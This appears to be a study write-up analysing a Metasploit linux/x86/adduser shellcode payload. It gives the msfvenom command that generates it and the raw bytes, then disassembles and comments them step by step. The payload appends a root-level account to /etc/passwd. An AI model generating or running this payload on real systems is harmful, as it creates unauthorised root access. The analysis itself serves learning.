

# Analyze: Read File

# Create shellcode
```bash
msfvenom -p linux/x86/adduser -f c USER=username PASS=pass123
```


# Analysis

## Disassemble w/ bash
```bash
echo -n "\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x26\x00\x00\x00\x75\x73\x65\x72\x6e\x61\x6d\x65\x3a\x41\x7a\x79\x64\x77\x66\x6f\x69\x67\x42\x54\x72\x73\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62\x69\x6e\x2f\x73\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a\x01\x58\xcd\x80" | ndisasm -u -
```

## Disassembled Assembly

```x86asm
00000000  31C9              xor ecx,ecx
00000002  89CB              mov ebx,ecx
00000004  6A46              push byte +0x46
00000006  58                pop eax
00000007  CD80              int 0x80
00000009  6A05              push byte +0x5
0000000B  58                pop eax
0000000C  31C9              xor ecx,ecx
0000000E  51                push ecx
0000000F  6873737764        push dword 0x64777373
00000014  682F2F7061        push dword 0x61702f2f
00000019  682F657463        push dword 0x6374652f
0000001E  89E3              mov ebx,esp
00000020  41                inc ecx
00000021  B504              mov ch,0x4
00000023  CD80              int 0x80
00000025  93                xchg eax,ebx
00000026  E826000000        call 0x51
0000002B  7573              jnz 0xa0
0000002D  65726E            gs jc 0x9e
00000030  61                popa
00000031  6D                insd
00000032  653A417A          cmp al,[gs:ecx+0x7a]
00000036  7964              jns 0x9c
00000038  7766              ja 0xa0
0000003A  6F                outsd
0000003B  6967425472733A    imul esp,[edi+0x42],dword 0x3a737254
00000042  303A              xor [edx],bh
00000044  303A              xor [edx],bh
00000046  3A2F              cmp ch,[edi]
00000048  3A2F              cmp ch,[edi]
0000004A  62696E            bound ebp,[ecx+0x6e]
0000004D  2F                das
0000004E  7368              jnc 0xb8
00000050  0A598B            or bl,[ecx-0x75]
00000053  51                push ecx
00000054  FC                cld
00000055  6A04              push byte +0x4
00000057  58                pop eax
00000058  CD80              int 0x80
0000005A  6A01              push byte +0x1
0000005C  58                pop eax
0000005D  CD80              int 0x80
```

Here I will dissect the assembly piece by piece, followed by a commented version of theh code in entirety.


## Disassembled (Cleaned and commented)

Here I have cleaned and commented the code

```x86asm
00000000  31C9              xor ecx,ecx
00000002  89CB              mov ebx,ecx
00000004  6A46              push byte +0x46
00000006  58                pop eax             ; 0x46 from stack
    ; cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep " 70$"
    ; setreuid()
    ; int setreuid(uid_t ruid, uid_t euid);
00000007  CD80              int 0x80




00000009  6A05              push byte +0x5
0000000B  58                pop eax             ; 0x5 from stack
    ; cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep " 5$"
    ; open ()
    ; int open(const char *pathname, int flags);
0000000C  31C9              xor ecx,ecx
0000000E  51                push ecx
0000000F  6873737764        push dword 0x64777373   ; (ascii) dwss
00000014  682F2F7061        push dword 0x61702f2f   ; (ascii) ap//
00000019  682F657463        push dword 0x6374652f   ; (ascii) cte/
0000001E  89E3              mov ebx,esp             ; /etc//passwd
00000020  41                inc ecx                 ; ecx = 1
00000021  B504              mov ch,0x4              ; ecx = 0x401 (O_WRONLY|O_APPEND)
00000023  CD80              int 0x80                ; open("/etc//passwd", 0x0401)



00000025  93                xchg eax,ebx            ; ebx = ptr to file
00000026  E826000000        call 0x51               ; call label1 


0000002B  757365726E616D653A417A796477666F6967425472733A303A303A3A2F3A2F62696E2F73680A
; (ascii) username:AzydwfoigBTrs:0:0::/:/bin/sh

label1:             
; rebuilt with `echo -n "`python2 -c 'print "\x90"*81'`\x59\x8b\x51\xfc\x61\x04\x58\xcd\x80\x6a\x01\x58\xcd\x80" | ndisasm -u -p intel -`
00000051  59                pop ecx             ; ptr to 0x2b
00000052  8B51FC            mov edx,[ecx-0x4]   ; 0x26 = 38 (uses opcode from E826 at offset 0x26)
00000055  6A04              push byte +0x4      ; 
00000057  58                pop eax             ; write()
00000058  CD80              int 0x80            ; ssize_t write(int fd, const void *buf, size_t count);



0000005A  6A01              push byte +0x1      
0000005C  58                pop eax             
0000005D  CD80              int 0x80            ; exit()
```
